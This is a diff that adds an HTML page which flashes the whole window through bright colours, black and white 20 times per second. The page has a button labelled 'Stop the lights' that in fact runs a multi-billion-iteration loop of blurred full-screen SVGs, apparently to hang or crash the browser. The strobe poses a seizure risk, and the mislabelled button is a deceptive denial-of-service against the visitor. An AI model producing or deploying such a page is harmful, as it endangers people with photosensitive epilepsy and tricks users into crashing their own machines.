@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Stroboscopic Effect</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    body {
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.05s;
+    }
+    #crash-btn {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 1em 2em;
+      font-size: 1.2em;
+      background: #fff;
+      border: 2px solid #333;
+      border-radius: 8px;
+      cursor: pointer;
+      z-index: 10;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+  <button id="crash-btn">Stop the lights</button>
+  <script>
+    // Stroboscopic effect
+    const colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF', '#FF00FF', '#FFFFFF', '#000000'];
+    let idx = 0;
+    setInterval(() => {
+      document.body.style.background = colors[idx % colors.length];
+      idx++;
+    }, 50); // 20 times per second
+
+    // Crash button
+    document.getElementById('crash-btn').onclick = function() {
+      // Create many SVG elements with background blur, stacked on top of each other
+      for (let i = 0; i < 5000000000; i++) {
+        const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+        svg.setAttribute('width', '100vw');
+        svg.setAttribute('height', '100vh');
+        svg.style.position = 'fixed';
+        svg.style.top = 0;
+        svg.style.left = 0;
+        svg.style.width = '100vw';
+        svg.style.height = '100vh';
+        svg.style.pointerEvents = 'none';
+        svg.style.zIndex = 100 + i;
+        svg.style.backdropFilter = 'blur(20px)';
+        svg.style.webkitBackdropFilter = 'blur(20px)';
+        // Add a colored rect to the SVG
+        const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+        rect.setAttribute('x', 0);
+        rect.setAttribute('y', 0);
+        rect.setAttribute('width', '100vw');
+        rect.setAttribute('height', '100vh');
+        rect.setAttribute('fill', `hsl(${i * 15 % 360}, 80%, 60%)`);
+        svg.appendChild(rect);
+        document.body.appendChild(svg);
+      }
+    };
+  </script>
+</body>
+</html>
